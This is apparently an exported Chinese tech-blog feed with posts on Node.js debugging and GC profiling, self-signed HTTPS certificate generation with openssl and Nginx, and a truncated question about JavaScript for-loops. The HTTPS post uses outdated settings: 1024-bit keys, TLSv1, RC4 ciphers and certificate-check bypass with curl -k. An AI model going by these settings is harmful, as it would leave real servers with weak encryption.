class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">➜  $ <span class="keyword">node</span> <span class="title">debug</span> <span class="tag">&lt;服务器IP&gt;</span>:<span class="tag">&lt;调试端口，默认5858&gt;</span></span><br></pre></td></tr></table></figure><p>可以在本地远程调试 nodejs 代码。不过这里需要区分下 <code>--debug</code> 和 <code>--debug-brk</code>，前者会执行完所有的代码，一般是在监听事件的时候使用，而后者，不会执行代码，需要等到外部调试接入后，进入代码区。语言表述不会那么生动，读者可以自行测试下。</p><p>默认端口号是 5858，如果这个端口被占用，程序会递增端口号，我们也可以指定端口：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">➜  <span class="keyword">node</span>  <span class="title">node</span> --<span class="attr">debug-brk=</span><span class="number">8787</span> proxy2.js</span><br><span class="line">Debugger listening on port <span class="number">8787</span></span><br></pre></td></tr></table></figure><h3 id="更多的调试方式"><a href="#更多的调试方式" class="headerlink" title="更多的调试方式"></a>更多的调试方式</h3><h4 id="node-inspector"><a href="#node-inspector" class="headerlink" title="node-inspector"></a>node-inspector</h4><p>NodeJS 提供的内建调试十分强大，它告诉 V8，在执行代码的时候中断程度，等待开发者操控代码的执行进度。我们熟知的 node-inspector 也是用的这个原理。</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">➜  $ <span class="keyword">node</span><span class="title">-inspector</span> --web-port <span class="number">8080</span> --debug-port <span class="number">5858</span> </span><br></pre></td></tr></table></figure><p>这里的 <code>--web-port</code> 是 Chrome Devtools 的调试页面地址端口，<code>--debug-port</code> 为 NodeJS 启动的内建 debug 端口，我们可以在 <code>http://localhost:8080/debug?port=5858</code> 打开页面，调试使用 <code>--debug(-brk)</code> 参数打开的程序。</p><p>更多设置可以查阅<a href="//www.npmjs.com/package/node-inspector">官方文档</a>。</p><h4 id="IDE调试"><a href="#IDE调试" class="headerlink" title="IDE调试"></a>IDE调试</h4><p>Eclipse 和 webstorm 的工具栏中都有一个叫做 Run 的选择栏，在这里可以配置该文件的执行方式，比如在 webstorm 中（Navigation&gt;Run&gt;Edit Configurations）：</p><p><strong>第一步，为程序添加一个启动程序</strong></p><p><img src="/../blogimgs/2015/10/07/20151003_6988a758.jpg" alt="step 1"></p><p>如果没有 Nodejs 的选项（如在 phpstorm 中），可以手动配置下。</p><p><strong>第二步，配置执行项</strong></p><p><img src="/../blogimgs/2015/10/07/20151003_52fb09e8.jpg" alt="step 2"></p><ul><li><code>Node interpreter</code> 是你 node 程序的位置</li><li><code>Node parameters</code> 是开启 nodejs 程序的选项，如果使用了 ES6 特性，需要开始 <code>--harmony</code> 模式，如果需要远程调试程序，可以使用 <code>--debug</code> 命令，我们采用控制台调试，显然是不需要添加 <code>--debug</code> 参数的。</li><li><code>Working directory</code> 是文件的目录</li><li><code>Javascript file</code> 是需要调试的文件</li></ul><p><strong>第三步，断点，调试</strong></p><p><img src="/../blogimgs/2015/10/07/20151003_4f41e088.jpg" alt="step 3"></p><p>其他 IDE 工具的调试大同小异，其原理也是通过 TCP 连接到 Nodejs 开启的内建调试端口。</p><h3 id="发现程序的问题"><a href="#发现程序的问题" class="headerlink" title="发现程序的问题"></a>发现程序的问题</h3><p>上面介绍了 NodeJS 调试需要掌握的几个基本技能，掌握起来还是很轻松的，但是要自己去尝试下。</p><p>Nodejs 相比 Java、PHP 这些老牌语言，其周边设施还是有所欠缺的，如性能分析和监控工具等，加上它的单线程运行特性，在大型应用中，很容易让系统的 CPU 或者内存达到瓶颈，从而导致程序崩溃。一旦发现程序警报 CPU 负载过高，或者内存飙高时，我们该如何深入排查 NodeJS 代码存在的问题呢？</p><p>首先来分析下问题，内存飙高存在哪些方面的因素呢：</p><ul><li>缓存，很多人在敲程序的时候把缓存当内存用，比如使用一个对象储存用户的 session 信息</li><li>闭包，作用域没有被释放掉</li><li>生产者和消费者存在速度差，比如数据库忙不过来，Query 队列堆积</li></ul><p>CPU 负载过高预警可能因素：</p><ul><li>垃圾回收频率过高、量太大，这一般是因为内存或者缓存暴涨导致的</li><li>密集型的长循环计算，比如大量遍历文件夹、大量计算等</li></ul><p>这些问题是最让人头疼的，一个项目几十上百个文件，收到这些警报如果没有经验，根本无从下手排查。</p><p>最直接的手段就是分析 GC 日志，因为程序的一举一动都会反馈到 GC 上，而上述问题也会一一指向 GC，如：</p><ul><li>内存暴涨，尤其是 Old Space 内存的暴涨，会直接导致 GC 的次数和时间增长</li><li>缓存增加，导致 GC 的时间增加，无用遍历过多</li><li>密集型计算，导致 GC Now Space次数增加</li></ul><hr><p>这里需要稍微插一段，NodeJS 的内存管理和垃圾回收机制。</p><p>V8 的内存分为 New Space 和 Old Space，New Space 的大小默认为 8M，Old Space 的大小默认为 0.7G，64位系统这两个数值翻倍。</p><p>对象的生命周期是：首先进入 New Space，在这里，New Space 被平均分为两份，每次 GC 都会将一份中的活着的对象复制到另一份，所以它的空间使用率是 50%，这个算法叫做 Cheney 算法，这个操作叫做 Scavenge。过一段时间，如果 New Space 中的对象还活着，会被挪到 Old Space 中去，GC 会每隔一段时间遍历 Old Space 中死掉的对象，然后整理碎片（这里有两种模式 mark-sweep 和 mark-compact，不祥述）。上面提到的”死掉“，指的是对象已经没有被引用了，活着说被引用的次数为零了。</p><hr><p>知道这些之后，我们就好分析问题了，如果缓存增加（比如使用对象缓存了很多用户信息），GC 是不知道这些缓存死了还是活着的，他们会不停地查看这个对象，以及这个对象中的子对象是否还存活，如果这个对象数特别大，那么 GC 遍历的时间也会特别长。当我们进行密集型计算的时候，会产生很多中间变量，这些变量往往在 New Space 中就死掉了，那么 GC 也会在这里多次地进行 New Space 区域的垃圾回收。</p><h3 id="分析-GC-日志"><a href="#分析-GC-日志" class="headerlink" title="分析 GC 日志"></a>分析 GC 日志</h3><p>说了这么多，如何去分析 GC 的日志？</p><p>在启动程序的时候添加 <code>--trace_gc</code> 参数，V8 在进行垃圾回收的时候，会将垃圾回收的信息打印出来：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">➜  $ <span class="keyword">node</span> <span class="title">--trace_gc</span> aa.js</span><br><span class="line">...</span><br><span class="line">[<span class="number">94036</span>]       <span class="number">68</span> ms: Scavenge <span class="number">8.4</span> (<span class="number">42.5</span>) -&gt; <span class="number">8.2</span> (<span class="number">43.5</span>) MB, <span class="number">2.4</span> <span class="keyword">ms</span> <span class="title">[allocation</span> failure].</span><br><span class="line">[<span class="number">94036</span>]       <span class="number">74</span> ms: Scavenge <span class="number">8.9</span> (<span class="number">43.5</span>) -&gt; <span class="number">8.9</span> (<span class="number">46.5</span>) MB, <span class="number">5.1</span> <span class="keyword">ms</span> <span class="title">[allocation</span> failure].</span><br><span class="line">[<span class="number">94036</span>] Increasing marking speed to <span class="number">3</span> due to high promotion rate</span><br><span class="line">[<span class="number">94036</span>]       <span class="number">85</span> ms: Scavenge <span class="number">16.1</span> (<span class="number">46.5</span>) -&gt; <span class="number">15.7</span> (<span class="number">47.5</span>) MB, <span class="number">3.8</span> <span class="keyword">ms</span> <span class="title">(+ 5</span>.<span class="number">0</span> <span class="keyword">ms</span> <span class="title">in</span> <span class="number">106</span> steps since last GC) [allocation failure].</span><br><span class="line">[<span class="number">94036</span>]       <span class="number">95</span> ms: Scavenge <span class="number">16.7</span> (<span class="number">47.5</span>) -&gt; <span class="number">16.6</span> (<span class="number">54.5</span>) MB, <span class="number">7.2</span> <span class="keyword">ms</span> <span class="title">(+ 1</span>.<span class="number">3</span> <span class="keyword">ms</span> <span class="title">in</span> <span class="number">14</span> steps since last GC) [allocation failure].</span><br><span class="line">[<span class="number">94036</span>]      <span class="number">111</span> ms: Mark-sweep <span class="number">23.6</span> (<span class="number">54.5</span>) -&gt; <span class="number">23.2</span> (<span class="number">54.5</span>) MB, <span class="number">6.2</span> <span class="keyword">ms</span> <span class="title">(+ 15</span>.<span class="number">3</span> <span class="keyword">ms</span> <span class="title">in</span> <span class="number">222</span> steps since <span class="literal">start</span> of marking, biggest step <span class="number">0.3</span> ms) [GC interrupt] [GC <span class="keyword">in</span> old space requested].</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>V8 提供了很多程序启动选项：</p><table><thead><tr><th>启动项</th><th align="center">含义</th></tr></thead><tbody><tr><td>–max-stack-size</td><td align="center">设置栈大小</td></tr><tr><td>–v8-options</td><td align="center">打印 V8 相关命令</td></tr><tr><td>–trace-bailout</td><td align="center">查找不能被优化的函数，重写</td></tr><tr><td>–trace-deopt</td><td align="center">查找不能优化的函数</td></tr></tbody></table><p>这些启动项都可以让我们查看 V8 在执行时的各种 log 日志，对于排查隐晦问题比较有用。然而这堆日志并不太好看，我们可以将日志输出来之后交给专业的工具帮我们分析，相比很多人都用过 Chrome DevTools 的 JavaScript CPU Profile，它在这里：</p><p><img src="/../blogimgs/2015/10/07/20151003_50333da0.jpg" alt="js profile"></p><p>通过 Profile 可以找到具体函数在整个程序中的执行时间和执行时间占比，从而分析到具体的代码问题，V8 也提供了 Profile 日志导出：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">➜  $ <span class="keyword">node</span> <span class="title">--prof</span> test.js</span><br></pre></td></tr></table></figure><p>执行命令之后，会在该目录下产生一个 <code>*-v8.log</code> 的日志文件，我们可以安装一个日志分析工具 tick:</p><figure class="highlight tap"><table><tr><td class="code"><pre><span class="line">➜  $ sudo npm install tick -g</span><br><span class="line">➜  $ node-tick-processor *-v8.log</span><br><span class="line">[Top down (heavy) profile]:</span><br><span class="line">  Note: callees occupying less than 0.1% are not shown.</span><br><span class="line"></span><br><span class="line">  inclusive      self           name</span><br><span class="line">  ticks   total  ticks   total</span><br><span class="line">   <span class="number"> 426 </span>  36.7%     <span class="number"> 0 </span>   0.0%  Function: ~&lt;anonymous&gt; node.js:27:10</span><br><span class="line">   <span class="number"> 426 </span>  36.7%     <span class="number"> 0 </span>   0.0%    LazyCompile: ~startup node.js:30:19</span><br><span class="line">   <span class="number"> 410 </span>  35.3%     <span class="number"> 0 </span>   0.0%      LazyCompile: ~Module.runMain module.js:499:26</span><br><span class="line">   <span class="number"> 409 </span>  35.2%     <span class="number"> 0 </span>   0.0%        LazyCompile: Module._load module.js:273:24</span><br><span class="line">   <span class="number"> 407 </span>  35.1%     <span class="number"> 0 </span>   0.0%          LazyCompile: ~Module.load module.js:345:33</span><br><span class="line">   <span class="number"> 406 </span>  35.0%     <span class="number"> 0 </span>   0.0%            LazyCompile: ~Module._extensions..js module.js:476:37</span><br><span class="line">   <span class="number"> 405 </span>  34.9%     <span class="number"> 0 </span>   0.0%              LazyCompile: ~Module._compile module.js:378:37</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>我们也可以使用 headdump 之类的工具将日志导出，然后放到 Chrome 的 Profile 中去分析。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本文主要从 NodeJS 程序的调试手段上，以及调试性能的入口上做了简要的介绍，希望对你有所启发，不到之处还请斧正！</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 前端杂烩 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nodejs </tag>
            
            <tag> debugger </tag>
            
            <tag> commandLine </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTPS证书生成原理和部署细节</title>
      <link href="/blog/2015/10/05/how-to-build-a-https-server/"/>
      <url>/blog/2015/10/05/how-to-build-a-https-server/</url>
      
        <content type="html"><![CDATA[<p>今天摸索了下 HTTPS 的证书生成，以及它在 Nginx 上的部署。由于博客托管在 github 上，没办法部署证书，先记录下，后续有需要方便快捷操作。本文的阐述不一定完善，但是可以让一个初学者了解大致的原理，同时跟着操作可以为自己的博客&#x2F;网站部署一个 HTTPS 证书。</p><p><a href="//www.hallaminternet.com/assets/https.jpg"><img src="/../blogimgs/2015/10/05/20151001_65a3140b.jpg" alt="https"></a></p><span id="more"></span><h3 id="网站部署-HTTPS-的重要性"><a href="#网站部署-HTTPS-的重要性" class="headerlink" title="网站部署 HTTPS 的重要性"></a>网站部署 HTTPS 的重要性</h3><p>看看下面，部分电信用户访问京东首页的时候，会看到右下角有一个浮动广告：</p><p><img src="/../blogimgs/2015/10/05/20151001_b342b301.jpg" alt="京东首页被电信DNS注入"></p><p>小白用户以为是京东有意放置的，细心的用户会发现，这个 iframe 一层嵌一层的恶心广告很明显是电信&#x2F;中间人通过 DNS 劫持注入进去的，十分恶心，没有关闭按钮。</p><p>随着互联网的快速发展，我们几乎离不开网络了，聊天、预订酒店、购物等等，我们的隐私无时无刻不暴露在这庞大的网络之中，HTTPS 能够让信息在网络中的传递更加安全，增加了 haker 的攻击成本。</p><p>HTTPS 区别于 HTTP，它多了加密(encryption)，认证(verification)，鉴定(identification)。它的安全源自非对称加密以及第三方的 CA 认证。</p><h3 id="简述-HTTPS-的运作"><a href="#简述-HTTPS-的运作" class="headerlink" title="简述 HTTPS 的运作"></a>简述 HTTPS 的运作</h3><p><a href="http://image.beekka.com/blog/2014/bg2014092003.png"><img src="/../blogimgs/2015/10/05/20151001_b347f684.jpg" alt="HTTPS交互"></a></p><p>如上图所示，简述如下：</p><ul><li>客户端生成一个随机数 <code>random-client</code>，传到服务器端（Say Hello)</li><li>服务器端生成一个随机数 <code>random-server</code>，和着公钥，一起回馈给客户端（I got it)</li><li>客户端收到的东西原封不动，加上 <code>premaster secret</code>（通过 <code>random-client</code>、<code>random-server</code> 经过一定算法生成的东西），再一次送给服务器端，这次传过去的东西会使用公钥加密</li><li>服务器端先使用私钥解密，拿到 <code>premaster secret</code>，此时客户端和服务器端都拥有了三个要素：<code>random-client</code>、<code>random-server</code> 和 <code>premaster secret</code></li><li>此时安全通道已经建立，以后的交流都会校检上面的三个要素通过算法算出的 <code>session key</code></li></ul><h3 id="CA-数字证书认证中心"><a href="#CA-数字证书认证中心" class="headerlink" title="CA 数字证书认证中心"></a>CA 数字证书认证中心</h3><p>如果网站只靠上图运作，可能会被中间人攻击，试想一下，在客户端和服务端中间有一个中间人，两者之间的传输对中间人来说是透明的，那么中间人完全可以获取两端之间的任何数据，然后将数据原封不动的转发给两端，由于中间人也拿到了三要素和公钥，它照样可以解密传输内容，并且还可以篡改内容。</p><p>为了确保我们的数据安全，我们还需要一个 CA 数字证书。HTTPS的传输采用的是非对称加密，一组非对称加密密钥包含公钥和私钥，通过公钥加密的内容只有私钥能够解密。上面我们看到，整个传输过程，服务器端是没有透露私钥的。而 CA 数字认证涉及到私钥，整个过程比较复杂，我也没有很深入的了解，后续有详细了解之后再补充下。</p><p>CA 认证分为三类：DV ( domain validation)，OV ( organization validation)，EV ( extended validation)，证书申请难度从前往后递增，貌似 EV 这种不仅仅是有钱就可以申请的。</p><p>对于一般的小型网站尤其是博客，可以使用自签名证书来构建安全网络，所谓自签名证书，就是自己扮演 CA 机构，自己给自己的服务器颁发证书。</p><h3 id="生成密钥、证书"><a href="#生成密钥、证书" class="headerlink" title="生成密钥、证书"></a>生成密钥、证书</h3><p>第一步，为服务器端和客户端准备公钥、私钥</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成服务器端私钥</span></span><br><span class="line">openssl genrsa -out server.key 1024</span><br><span class="line"><span class="comment"># 生成服务器端公钥</span></span><br><span class="line">openssl rsa -<span class="keyword">in</span> server.key -pubout -out server.pem</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 生成客户端私钥</span></span><br><span class="line">openssl genrsa -out client.key 1024</span><br><span class="line"><span class="comment"># 生成客户端公钥</span></span><br><span class="line">openssl rsa -<span class="keyword">in</span> client.key -pubout -out client.pem</span><br></pre></td></tr></table></figure><p>第二步，生成 CA 证书</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 生成 CA 私钥</span></span><br><span class="line">openssl genrsa -out ca.key 1024</span><br><span class="line"><span class="comment"># X.509 Certificate Signing Request (CSR) Management.</span></span><br><span class="line">openssl req -new -key ca.key -out ca.csr</span><br><span class="line"><span class="comment"># X.509 Certificate Data Management.</span></span><br><span class="line">openssl x509 -req -<span class="keyword">in</span> ca.csr -signkey ca.key -out ca.crt</span><br></pre></td></tr></table></figure><p>在执行第二步时会出现：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  keys  openssl req -new -key ca.key -out ca.csr</span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="line">There are quite a few fields but you can leave some blank</span><br><span class="line">For some fields there will be a default value,</span><br><span class="line">If you enter <span class="string">&#x27;.&#x27;</span>, the field will be left blank.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [AU]:CN</span><br><span class="line">State or Province Name (full name) [Some-State]:Zhejiang</span><br><span class="line">Locality Name (eg, city) []:Hangzhou</span><br><span class="line">Organization Name (eg, company) [Internet Widgits Pty Ltd]:My CA</span><br><span class="line">Organizational Unit Name (eg, section) []:</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []:localhost</span><br><span class="line">Email Address []:</span><br></pre></td></tr></table></figure><p>注意，这里的 <code>Organization Name (eg, company) [Internet Widgits Pty Ltd]:</code> 后面生成客户端和服务器端证书的时候也需要填写，不要写成一样的！！！可以随意写如：My CA, My Server, My Client。</p><p>然后 <code>Common Name (e.g. server FQDN or YOUR name) []:</code> 这一项，是最后可以访问的域名，我这里为了方便测试，写成 <code>localhost</code>，如果是为了给我的网站生成证书，需要写成 <code>barretlee.com</code>。</p><p>第三步，生成服务器端证书和客户端证书</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 服务器端需要向 CA 机构申请签名证书，在申请签名证书之前依然是创建自己的 CSR 文件</span></span><br><span class="line">openssl req -new -key server.key -out server.csr</span><br><span class="line"><span class="comment"># 向自己的 CA 机构申请证书，签名过程需要 CA 的证书和私钥参与，最终颁发一个带有 CA 签名的证书</span></span><br><span class="line">openssl x509 -req -CA ca.crt -CAkey ca.key -CAcreateserial -<span class="keyword">in</span> server.csr -out server.crt</span><br><span class="line"></span><br><span class="line"><span class="comment"># client 端</span></span><br><span class="line">openssl req -new -key client.key -out client.csr</span><br><span class="line"><span class="comment"># client 端到 CA 签名</span></span><br><span class="line">openssl x509 -req -CA ca.crt -CAkey ca.key -CAcreateserial -<span class="keyword">in</span> client.csr -out client.crt</span><br></pre></td></tr></table></figure><p>此时，我们的 keys 文件夹下已经有如下内容了：</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── https-client<span class="selector-class">.js</span></span><br><span class="line">├── https-server<span class="selector-class">.js</span></span><br><span class="line">└── keys</span><br><span class="line">    ├── ca<span class="selector-class">.crt</span></span><br><span class="line">    ├── ca<span class="selector-class">.csr</span></span><br><span class="line">    ├── ca<span class="selector-class">.key</span></span><br><span class="line">    ├── ca<span class="selector-class">.pem</span></span><br><span class="line">    ├── ca<span class="selector-class">.srl</span></span><br><span class="line">    ├── client<span class="selector-class">.crt</span></span><br><span class="line">    ├── client<span class="selector-class">.csr</span></span><br><span class="line">    ├── client<span class="selector-class">.key</span></span><br><span class="line">    ├── client<span class="selector-class">.pem</span></span><br><span class="line">    ├── server<span class="selector-class">.crt</span></span><br><span class="line">    ├── server<span class="selector-class">.csr</span></span><br><span class="line">    ├── server<span class="selector-class">.key</span></span><br><span class="line">    └── server.pem</span><br></pre></td></tr></table></figure><p>看到上面两个 js 文件了么，我们来跑几个demo。</p><h3 id="HTTPS本地测试"><a href="#HTTPS本地测试" class="headerlink" title="HTTPS本地测试"></a>HTTPS本地测试</h3><p>服务器代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// file http-server.js</span></span><br><span class="line"><span class="keyword">var</span> https = <span class="built_in">require</span>(<span class="string">&#x27;https&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">  <span class="attr">key</span>: fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./keys/server.key&#x27;</span>),</span><br><span class="line">  <span class="attr">cert</span>: fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./keys/server.crt&#x27;</span>)</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">https.<span class="title function_">createServer</span>(options, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">writeHead</span>(<span class="number">200</span>);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;hello world&#x27;</span>);</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">8000</span>);</span><br></pre></td></tr></table></figure><p>短短几行代码就构建了一个简单的 https 服务器，options 将私钥和证书带上。然后利用 curl 测试：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  https  curl //localhost:8000</span><br><span class="line">curl: (60) SSL certificate problem: Invalid certificate chain</span><br><span class="line">More details here: http://curl.haxx.se/docs/sslcerts.html</span><br><span class="line"></span><br><span class="line">curl performs SSL certificate verification by default, using a <span class="string">&quot;bundle&quot;</span></span><br><span class="line"> of Certificate Authority (CA) public keys (CA certs). If the default</span><br><span class="line"> bundle file isn<span class="string">&#x27;t adequate, you can specify an alternate file</span></span><br><span class="line"><span class="string"> using the --cacert option.</span></span><br><span class="line"><span class="string">If this HTTPS server uses a certificate signed by a CA represented in</span></span><br><span class="line"><span class="string"> the bundle, the certificate verification probably failed due to a</span></span><br><span class="line"><span class="string"> problem with the certificate (it might be expired, or the name might</span></span><br><span class="line"><span class="string"> not match the domain name in the URL).</span></span><br><span class="line"><span class="string">If you&#x27;</span>d like to turn off curl<span class="string">&#x27;s verification of the certificate, use</span></span><br><span class="line"><span class="string"> the -k (or --insecure) option.</span></span><br></pre></td></tr></table></figure><p> 当我们直接访问时，<code>curl //localhost:8000</code> 一堆提示，原因是没有经过 CA 认证，添加 <code>-k</code> 参数能够解决这个问题：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  https  curl -k //localhost:8000</span><br><span class="line">hello world%</span><br></pre></td></tr></table></figure><p>这样的方式是不安全的，存在我们上面提到的中间人攻击问题。可以搞一个客户端带上 CA 证书试试：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// file http-client.js</span></span><br><span class="line"><span class="keyword">var</span> https = <span class="built_in">require</span>(<span class="string">&#x27;https&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> options = &#123;</span><br><span class="line">  <span class="attr">hostname</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">  <span class="attr">port</span>: <span class="number">8000</span>,</span><br><span class="line">  <span class="attr">path</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">  <span class="attr">methed</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">  <span class="attr">key</span>: fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./keys/client.key&#x27;</span>),</span><br><span class="line">  <span class="attr">cert</span>: fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./keys/client.crt&#x27;</span>),</span><br><span class="line">  <span class="attr">ca</span>: [fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;./keys/ca.crt&#x27;</span>)]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">options.<span class="property">agent</span> = <span class="keyword">new</span> https.<span class="title class_">Agent</span>(options);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> req = https.<span class="title function_">request</span>(options, <span class="keyword">function</span>(<span class="params">res</span>) &#123;</span><br><span class="line">  res.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span>(<span class="params">d</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(d);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">req.<span class="title function_">end</span>();</span><br><span class="line"></span><br><span class="line">req.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="keyword">function</span>(<span class="params">e</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>先打开服务器 <code>node http-server.js</code>，然后执行 </p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">➜  https  node https-client.<span class="property">js</span></span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><p>如果你的代码没有输出 <code>hello world</code>，说明证书生成的时候存在问题。也可以通过浏览器访问：</p><p><img src="/../blogimgs/2015/10/05/20151001_9bf819eb.jpg" alt="https证书问题"></p><p>提示错误：</p><blockquote><p>此服务器无法证明它是localhost；您计算机的操作系统不信任其安全证书。出现此问题的原因可能是配置有误或您的连接被拦截了。</p></blockquote><p>原因是浏览器没有 CA 证书，只有 CA 证书，服务器才能够确定，这个用户就是真实的来自 localhost 的访问请求（比如不是代理过来的）。</p><p>你可以点击 <code>继续前往localhost（不安全）</code> 这个链接，相当于执行 <code>curl -k //localhost:8000</code>。如果我们的证书不是自己颁发，而是去靠谱的机构去申请的，那就不会出现这样的问题，因为靠谱机构的证书会放到浏览器中，浏览器会帮我们做很多事情。初次尝试的同学可以去 <a href="//startssl.com">startssl.com</a> 申请一个免费的证书。</p><h3 id="Nginx-部署"><a href="#Nginx-部署" class="headerlink" title="Nginx 部署"></a>Nginx 部署</h3><p>ssh 到你的服务器，对 Nginx 做如下配置：</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">server_names</span> barretlee.com <span class="regexp">*.barretlee.com</span></span><br><span class="line">ssl <span class="literal">on</span>;</span><br><span class="line"><span class="attribute">ssl_certificate</span> /etc/nginx/ssl/barretlee.com.crt;</span><br><span class="line"><span class="attribute">ssl_certificate_key</span> /etc/nginx/ssl/barretlee.com.key;</span><br><span class="line"><span class="attribute">ssl_protocols</span> TLSv1 TLSv1.<span class="number">1</span> TLSv1.<span class="number">2</span>;</span><br><span class="line"><span class="attribute">ssl_ciphers</span> <span class="string">&quot;EECDH+ECDSA+AESGCM EECDH+aRSA+AESGCM EECDH+ECDSA+SHA384EECDH+ECDSA+SHA256 EECDH+aRSA+SHA384 EECDH+aRSA+SHA256 EECDH+aRSA+RC4EECDH EDH+aRSA RC4 !aNULL !eNULL !LOW !3DES !MD5 !EXP !PSK !SRP !DSS !MEDIUM&quot;</span>;</span><br><span class="line"><span class="comment"># Add perfect forward secrecy</span></span><br><span class="line"><span class="attribute">ssl_prefer_server_ciphers</span> <span class="literal">on</span>;</span><br><span class="line"><span class="attribute">add_header</span> Strict-Transport-Security <span class="string">&quot;max-age=31536000; includeSubdomains&quot;</span>;</span><br></pre></td></tr></table></figure><p>会发现，网页 URL 地址框左边已经多出了一个小绿锁。当然，部署好了之后可以去<a href="//www.ssllabs.com/ssltest/analyze.html">这个网站</a>看看测评分数，如果分数是 A+，说明你的 HTTPS 的各项配置都还不错，速度也很快。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>好吧，我也是初次尝试，本地测试是 ok 的，由于买的阿里云服务器到期了也没续费，就没远程折腾，其实本地 Nginx + Nodejs，然后 Hosts 配置域名也是可以较好模拟的。文中很多地方描述的可能不是十分准确，提到的点也不够全面，如果有错误，还请斧正！</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> HTTPS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript 关于 for 循环中的疑问</title>
      <link href="/blog/2015/09/30/confusion-about-for-loop-var/"/>
      <url>/blog/2015/09/30/confusion-about-for-loop-var/</url>
      
        <content type="html"><![CDATA[<p>底部有更新, 疑惑已经解开。</p><hr><p>我一直都没搞明白，for 循环的 <code>var</code> 声明是怎么使用的。</p><span id="more"></span><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">for</span><span class="params">(var i = <span class="number">0</span>; i &lt; len; i++ )</span></span> &#123;</span><br><span class="line">  <span class="comment">// code… </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后的结果是这样？</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&#123;var i <span class="operator">=</span> <span class="number">0</span><span class="comment">;  // code… &#125;</span></span><br><span class="line">&#123;var i <span class="operator">=</span> <span class="number">1</span><span class="comment">;  // code… &#125;</span></span><br><span class="line">&#123;var i <span class="operator">=</span> <span class="number">2</span><span class="comment">;  // code… &#125;</span></span><br></pre></td></tr></table></figure><p>还是这样：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">var i<span class="comment">;</span></span><br><span class="line">&#123;i <span class="operator">=</span> <span class="number">1</span><span class="comment">;  // code… &#125;</span></span><br><span class="line">&#123;i <span class="operator">=</span> <span class="number">2</span><span class="comment">;  // code… &#125;</span></span><br><span class="line">&#123;i <span class="operator">=</span> <span class="number">3</span><span class="comment">;  // code… &#125;</span></span><br></pre></td></tr></table></figure><p>但是根据 ES6 中 let 关键词的例子：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">var a <span class="operator">=</span> []<span class="comment">;</span></span><br><span class="line">for (let i <span class="operator">=</span> <span class="number">0</span><span class="comment">; i &lt; 10; i++) &#123;</span></span><br><span class="line">  a[i] <span class="operator">=</span> function () 